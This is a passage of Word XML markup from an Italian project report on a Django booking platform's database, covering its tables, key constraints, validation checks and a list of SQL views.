          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5EB4EEE1" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_servizio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5E3D2865" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Servizi disponibili negli alloggi.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="75418BEE" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1A3CF031" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>offre</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2ED73A61" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_alloggio, id_servizio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="11E76605" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Associazione molti-a-molti tra alloggi e servizi.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="39EE6032" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6EA2198D" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>badge</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5BBB2C3C" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_badge</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="369CD6EF" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Riconoscimenti assegnabili agli host.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="455516CA" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="08ED420C" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>ottiene</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="110B7EB5" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_host, id_badge</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0108B003" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Associazione tra host e badge, con data di ottenimento.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="257AC154" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6C5829F5" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>citta</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0D4E9ADC" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_citta</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B97B155" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Città in cui si trovano gli alloggi.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="5BEAD94A" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="715776E0" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>punti_interesse</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="43785487" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_punto_interesse</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7A4FA145" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Luoghi rilevanti collegati alle città.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5B9EC439" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
      <w:r>
        <w:t>9. Vincoli e controlli principali</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74DA9E76" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Nel database sono presenti vincoli strutturali basati su chiavi primarie e chiavi esterne. Questi vincoli servono a mantenere la coerenza dei collegamenti tra le tabelle e </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> impedire riferimenti non validi.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01FE1A52" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>alloggio.id_host fa riferimento a host.id_host, quindi ogni alloggio può essere ricondotto all’host che lo gestisce;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C445C3D" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>alloggio.id_citta fa riferimento a citta.id_citta, permettendo la localizzazione geografica;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3593363A" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>esperienze.id_agenzia fa riferimento ad agenzia.id_agenzia;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B942407" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>prenotazione_alloggio collega utente e alloggio tramite id_utente e id_alloggio;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3710B6" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>prenotazione_esperienze collega utente ed esperienza tramite id_utente e id_esperienza;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3488ECCF" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>recensione_alloggio è collegata a prenotazione_alloggio;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F1A11D" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000" w:rsidP="00683795">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>recensione_esperienze</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> è </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>collegata</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>prenotazione_esperienze</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67BE75D4" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>livello</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>applicativo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>alcune</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> funzioni Django aggiungono controlli ulteriori. Per esempio, durante la prenotazione di un alloggio vengono controllate la validità delle date, la capienza e il calcolo del prezzo totale. Durante la prenotazione di un’esperienza viene controllato che la data non sia nel passato e che il numero di partecipanti non superi la capienza massima. Nel profilo utente viene inoltre controllato che una recensione venga inserita solo dopo la conclusione del </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>soggiorno</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> o </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dell’esperienza</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BB2ADF" w14:textId="77777777" w:rsidR="00683795" w:rsidRDefault="00683795">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77687337" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000" w:rsidP="00683795">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
      <w:r>
        <w:t>10. Viste SQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D190CBF" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Le viste SQL sono uno degli elementi più importanti del progetto. Sono state </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>create</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> per semplificare interrogazioni frequenti e per rendere più comoda l’integrazione con Django. Una vista non sostituisce le tabelle principali, ma offre una rappresentazione già elaborata dei dati.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Grigliatabella"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3530"/>
        <w:gridCol w:w="5904"/>
      </w:tblGrid>
      <w:tr w:rsidR="00597ADF" w14:paraId="1A9291DF" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3530" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9EAF7"/>
          </w:tcPr>
          <w:p w14:paraId="450B00AF" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Vista</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5904" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9EAF7"/>
          </w:tcPr>
          <w:p w14:paraId="522618CF" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Descrizione</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="72B660CD" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="03F2D53B" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>vista_alloggi_con_servizi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5904" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="15EAFB46" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mostra gli alloggi con l’elenco dei servizi disponibili.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="227BDD4F" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="59AC9766" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>vista_classifica_alloggi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5904" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4D3918DE" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Permette di ordinare e valutare gli alloggi in base alle recensioni.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="1351967F" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="04E5DF51" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>vista_classifica_esperienze</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5904" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="01B4E213" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Permette di valutare le esperienze in base alle recensioni.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="76F450CD" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3C074455" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>vista_dashboard_guadagni_host</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5904" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7DD53237" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mostra guadagni e numero di prenotazioni per host.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="165C8705" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="15CCCD2C" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>vista_dashboard_guadagni_agenzia</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5904" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6CE7DED5" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mostra guadagni, prenotazioni e partecipanti relativi alle esperienze delle agenzie.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="1D0C22DB" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="76B4852F" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>vista_dettaglio_prenotazione_ospite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5904" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="06664906" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Raccoglie i dettagli utili di una prenotazione di alloggio.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="3C86A050" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="75A1DD75" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>vista_esplora_dintorni</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5904" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5DB9D0A8" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Collega alloggi, città e punti di interesse.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="1808DF82" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="13C0EA64" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>vista_fatturazione_prenotazioni</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5904" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6AECC32F" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Raccoglie informazioni utili per </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>la fatturazione</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> delle prenotazioni.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="762B5B43" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="27733467" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>vista_prenotazioni_da_recensire</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5904" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="09AE1369" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Individua prenotazioni concluse che possono essere recensite.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="263A915B" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="78591B6A" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>vista_profilo_agenzia_completo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5904" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0D7D97F0" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mostra dati dell’agenzia, lingue parlate ed esperienze offerte.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="735D878D" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2FE70842" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>vista_profilo_ospite_crm</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5904" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4D34884B" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Riassume l’attività dell’utente come ospite.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="5E1E2DD0" w14:textId="77777777" w:rsidTr="002F0F19">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
